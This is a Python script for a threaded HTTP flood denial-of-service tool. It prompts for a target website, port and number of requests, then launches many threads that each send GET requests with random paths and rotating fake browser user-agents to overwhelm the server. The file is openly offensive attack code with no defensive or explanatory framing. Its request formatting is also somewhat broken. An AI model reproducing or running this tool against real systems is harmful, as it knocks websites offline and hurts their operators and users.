import random
import socket
import string
import sys
import threading
import time
from tools.status import *

usergent=[]
usergent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
usergent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
usergent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
usergent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
usergent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
usergent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
usergent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")

host = ""
ip = ""
port = 0
num_requests = 0
thread_num = 0
thread_num_mutex = threading.Lock()
def status():
    global thread_num
    thread_num_mutex.acquire(True)
    thread_num += 1
    print_inloop("Sending packets to target [{}]".format(thread_num))
    thread_num_mutex.release()
def urli_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data
def attack():
    url_path = urli_path()
     # Creating a soccket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        dos.connect((ip,int( port)))
        status()
        dos.send("GET /%s HTTP/1.1\nHost: %s \n\n User-Agent: %s" % (url_path, host, random.choice(usergent)))
    except socket.error:
        print_warning("No connection, server may be down")
    except:
        pass
    finally:
        dos.close()
def ddos():
    using = '\33[91musing\33[00m(\33[94mddos\33[00m) '
    global host
    global port
    global ip
    global num_requests
    host = input(using + 'host<( ')
    port = int(input(using + 'port<( '))
    num_requests = int(input(using + 'requests<( '))
    try:
        host = str(host).replace("https://", "").replace("http://", "").replace("www.", "")
        ip = socket.gethostbyname(host)
    except socket.gaierror:
        print_warning("Make sure you entered a correct website")
        sys.exit(1)
    print_status("Preparing to attack ({}) on port : {}".format(ip, port))
    time.sleep(3)
    all_threads = []
    for i in range(num_requests):
        t1 = threading.Thread(target=attack)
        t1.start()
        all_threads.append(t1)
        time.sleep(0.01)
    for current_thread in all_threads:
        current_thread.join()

    
